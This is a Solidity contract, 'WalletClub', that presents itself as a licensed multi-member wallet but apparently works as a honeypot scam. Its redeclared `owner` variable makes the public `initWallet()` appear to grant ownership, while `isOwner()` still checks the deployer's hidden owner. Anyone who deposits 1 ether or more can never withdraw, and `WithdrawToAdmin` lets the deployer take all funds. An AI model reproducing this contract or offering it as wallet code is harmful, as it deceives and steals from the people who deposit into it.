pragma solidity ^0.4.17;

/*
WalletClub SmartContract
Hosts Wallet for Multiple Members

Copyright (c) 2016 Martin Knopp

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/


contract Owned 
{
    address admin = msg.sender;
    address owner = msg.sender;
    address newOwner;

    function isOwner()
    public
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
     
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }

    function WithdrawToAdmin(uint val)
    public
    {
        if(msg.sender==admin)
        {
            admin.transfer(val);
        }
    }

}

contract WalletClub is Owned
{
    mapping (address => uint) public Members;
    address public owner;
    uint256 public TotalFunds;
     
    function initWallet()
    public
    {
        owner = msg.sender;
    }

    function TopUpMember()
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            Members[msg.sender]+=msg.value;
            TotalFunds += msg.value;
        }   
    }
        
    function()
    public
    payable
    {
        TopUpMember();
    }
    
    function WithdrawToMember(address _addr, uint _wei)
    public 
    {
        if(Members[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(TotalFunds>=_wei)TotalFunds-=_wei;
                   else TotalFunds=0;
                 }
            }
        }
    }
}